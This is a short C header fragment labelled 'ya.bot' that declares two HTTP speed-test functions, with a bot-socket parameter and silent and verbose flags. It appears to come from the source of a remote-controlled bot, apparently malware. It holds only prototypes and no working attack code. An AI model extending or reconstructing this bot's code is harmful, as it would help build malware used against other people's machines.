/*  ya.bot  */

#ifndef NO_SPEEDTEST
void speedtest_http(SOCKET bsock,
		char *pszAction,
		char *pszDestination,
		bool bSilent,
		bool bVerbose);
DWORD speedtest_httpgetspeed(char *pszHost);
#endif